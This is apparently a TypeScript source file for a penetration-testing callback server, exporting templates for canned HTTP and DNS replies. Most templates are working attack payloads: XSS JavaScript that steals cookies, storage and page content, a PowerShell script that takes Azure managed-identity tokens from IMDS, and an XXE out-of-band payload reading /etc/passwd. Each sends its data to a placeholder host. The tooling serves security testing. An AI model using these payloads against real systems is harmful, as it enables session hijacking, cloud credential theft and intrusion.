// Copyright (c) Microsoft Corporation.
// Licensed under the MIT License.

export const JSAlertDomain =
  `id: jsalertdom
title: XSS alert() domain
description: This payload will show an alert with the current domain.
rules:
  - name: reply with js alert
    protocol: http
    predicates:
    - http.method: get
    results:
    - http.code: 200
    - http.header: | 
        Content-Type: application/javascript
      http.body: |
        // show current domain
        alert(document.domain)`

export const CORSOptionsCall =
  `id: cors
title: CORS (cross origin resource sharing) preflight settings
description: This sends a very permissive CORS reply to any OPTIONS request.
rules:
  - name: OPTIONS call CORS
    protocol: http
    predicates:
    - http.method: options
    results:
    - http.code: 200
    - http.header: "Access-Control-Allow-Credentials: true"
    - http.header: "Access-Control-Allow-Headers: *"
    - http.header: "Access-Control-Allow-Origin: *"
    - http.header: "Access-Control-Allow-Origin: *"`

export const XssExfilCall =
  `id: exfiljs
title: Exfiltrate DOM using JS
description: This payload will exfiltrate data from the DOM (document object model) using JavaScript.
rules:
  - name: JS reply
    protocol: http
    predicates:
      - http.method: GET
    results:
      - http.code: 200
      - http.header: "Content-Type: application/javascript"
      - var: __URL__:zone()          
      - http.body: | 
          var body = document.body.innerHTML;
          var cookies = document.cookie;
          var sessionStorage = JSON.stringify(sessionStorage);
          var localstorage = JSON.stringify(localStorage);
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "https://__URL__/upload", true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.send(JSON.stringify({
            domain: document.domain,
            body: body, 
            cookies: cookies, 
            sessionStorage: sessionStorage, 
            localstorage: localstorage
          }));`

export const KeyVaultTokenExfil =
  `id: psimdskeyvault
title: Powershell to get IMDS tokens
description: PowerShell 5+ payload to retrieve MSI (managed identity) tokens for Azure Keyvault (vault.azure.net).
rules:
  - name: Reply Powershell code to PS clients
    protocol: http
    predicates:
      - http.method: get
      - http.path: .*.ps+?
    results:
      - var: __URL__:zone()
      - http.code: 200
      - http.body: |
          $imds = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net"
          $token = Invoke-RestMethod -Uri $imds -Method GET -Headers @{Metadata="true"};
          $b64 = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$token"))
          $Response2 = Invoke-RestMethod -Uri https://__URL__ -Method POST -Body $b64`

export const XXEOOBCall =
  `id: xxeoob
title: XXE Call
description: XXE Payload to exfil /etc/passwd file.
rules:
  - name: Reply XML payload
    protocol: http
    predicates:
      - http.method: get
      - http.path: .*.xml
    results:
      - var: __URL__:zone()
      - http.code: 200
      - http.body: |
          <?xml version="1.0" ?>
          <!DOCTYPE r [
          <!ELEMENT r ANY >
          <!ENTITY % sp SYSTEM "https://__URL__/stage2.dtd">
            %sp;
            %param1;
          ]>
          <r>&exfil;</r>
  - name: Stage2 DTD payload
    protocol: http
    predicates:
      - http.method: get
      - http.path: stage2.dtd
    results:
      - var: __URL__:zone()
      - http.code: 200
      - http.body: |
          <!ENTITY % data SYSTEM "file:///etc/passwd">
          <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://__URL__/%data;'>">`

export const DNSSetToLocalhost =
  `id: localhost
title: Reply with localhost
description: Reply to DNS A record requests with 127.0.0.1 (but will still log requests).
rules:
  - name: Reply with localhost
    protocol: dns
    predicates:
      - dns.type: A
    results:
      - dns.type: A
      - dns.data: '{"ip":"127.0.0.1"}'
`